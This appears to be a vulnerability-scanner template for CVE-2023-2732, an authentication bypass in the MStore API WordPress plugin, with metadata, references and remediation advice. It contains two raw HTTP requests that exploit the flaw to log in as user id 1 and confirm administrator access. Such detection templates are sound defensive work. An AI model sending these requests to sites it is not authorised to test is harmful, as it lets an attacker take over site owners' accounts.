http:
- matchers:
  - condition: and
    part: body_2
    type: word
    words:
    - email-description
    - Username
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /wp-json/wp/v2/add-listing?id=1 HTTP/2

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
  - 'GET /wp-admin/profile.php HTTP/2

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    '
id: CVE-2023-2732
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:inspireui:mstore_api:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2023-2732
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-288,NVD-CWE-Other
    epss-percentile: 0.96037
    epss-score: 0.22111
  description: 'The MStore API plugin for WordPress is vulnerable to authentication
    bypass in versions up to, and including, 3.9.2. This is due to insufficient verification
    on the user being supplied during the add listing REST API request through the
    plugin. This makes it possible for unauthenticated attackers to log in as any
    existing user on the site, such as an administrator, if they have access to the
    user id.

    '
  impact: 'An attacker can bypass authentication and gain unauthorized access to the
    MStore API, potentially leading to data breaches or unauthorized actions.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: mstore_api
    vendor: inspireui
    verified: true
  name: MStore API <= 3.9.2 - Authentication Bypass
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/f00761a7-fe24-49a3-b3e3-a471e05815c1?source=cve
  - https://github.com/RandomRobbieBF/CVE-2023-2732
  - https://wordpress.org/plugins/mstore-api/
  - https://plugins.trac.wordpress.org/browser/mstore-api/tags/3.9.0/controllers/listing-rest-api/class.api.fields.php#L1079
  - https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=2916124%40mstore-api&old=2915729%40mstore-api&sfp_email=&sfph_mail=#file58
  remediation: 'Upgrade to a patched version of MStore API (version 3.9.3 or above)
    to mitigate the authentication bypass vulnerability.

    '
  severity: critical
  tags: cve,cve2023,wordpress,wp,wp-plugin,auth-bypass,mstore-api,inspireui
